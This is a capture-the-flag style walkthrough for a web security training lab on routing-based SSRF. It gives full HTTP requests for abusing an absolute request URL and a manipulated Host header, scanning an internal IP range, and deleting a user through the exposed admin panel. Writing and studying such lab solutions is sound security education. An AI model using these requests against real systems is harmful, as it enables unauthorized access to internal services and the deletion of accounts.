## SSRF via flawed request parsing

This lab is vulnerable to routing-based SSRF due to its flawed parsing of the request's intended host. You can exploit this to access an insecure intranet admin panel located at an internal IP address.

To solve the lab, access the internal admin panel located in the 192.168.0.0/24 range, then delete the user carlos.

Note :

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

## Notes

- /login

## Resume

1. Confirm that the middleware issues requests to arbitrary servers.
2. Use an absolute URL in the request line.
3. Scan the internal `192.168.0.0/24` range using the `Host` header.
4. Find the internal admin interface.
5. Access `/admin`.
6. Submit a crafted delete request for `carlos`.

## Solve

Send the `GET /` request that received a `200` response to Burp Repeater and study the application behavior.

Observe that the website validates the `Host` header and blocks requests where it has been modified.

You can also access the home page by supplying an absolute URL in the request line:

```http
GET https://0a9b009a0312b02481e648a200ef009f.web-security-academy.net/ HTTP/2
```

Notice that when you do this, modifying the `Host` header no longer causes the request to be blocked. Instead, you receive a timeout error. This suggests that the absolute URL is being validated instead of the `Host` header.

Use Burp Collaborator to confirm that the website’s middleware can issue requests to an arbitrary server in this way.

Example:

```http
GET https://0a9b009a0312b02481e648a200ef009f.web-security-academy.net/ HTTP/2
Host: 58bfcnkic6mhw9lpwxe8yllgc7iy6pue.oastify.com
```

Right-click and select **Insert Collaborator payload** to insert a Collaborator domain where indicated.

Send the request containing the absolute URL to Burp Intruder.

Go to Intruder and deselect **Update Host header to match target**.

Use the `Host` header to scan the IP range `192.168.0.0/24` to identify the IP address of the admin interface.

A working Intruder request looks like this:

```http
GET https://0a9b009a0312b02481e648a200ef009f.web-security-academy.net/ HTTP/2
Host: 192.168.0.§§
```

After the attack finishes, sort by the `Status` column. One IP should return a `302` redirect to `/admin`. Send that request to Burp Repeater.

In Burp Repeater, append `/admin` to the absolute URL in the request line and send the request. You should now have access to the admin panel.

Next, change the absolute URL to point to `/admin/delete`.

Copy the CSRF token from the response and add it as a query parameter, along with `username=carlos`.

The request line should now look like this:

```http
GET https://0a9b009a0312b02481e648a200ef009f.web-security-academy.net/admin/delete?csrf=M7sarprcDXdYdYWuOMOoNiORVr6UHWAX&username=carlos HTTP/2
```

Copy the session cookie from the `Set-Cookie` header in the response and add it to your request.

Right-click the request and select **Change request method**. Burp will convert it to a `POST` request.

Your final request should look like this:

```http
POST https://0a9b009a0312b02481e648a200ef009f.web-security-academy.net/admin/delete?csrf=M7sarprcDXdYdYWuOMOoNiORVr6UHWAX&username=carlos HTTP/2
Host: 192.168.0.192
Cookie: session=1UbhyunWr0kfMzysrCaUva31KNI7etf1; _lab=46%7cMCwCFFE2v7UWt8KJRy2XhG816Zru%2bYNgAhQCKupmRsEeSN4%2bFwmRrbfUfQWRlbiY5%2ff6g1uAKeoLiR%2bGjr5QdsU6VRl0G%2fo4%2b%2bJu5ArzeIywLLnPFozKGLzhpdwHUIswuC0twgstBxmonqy6Emyj1cDeU8x0x38N4CA%2bJ5lOo2H9sxU%3d
Content-Length: 53

username=carlos&csrf=M7sarprcDXdYdYWuOMOoNiORVr6UHWAX
```

Send the request to delete `carlos` and solve the lab.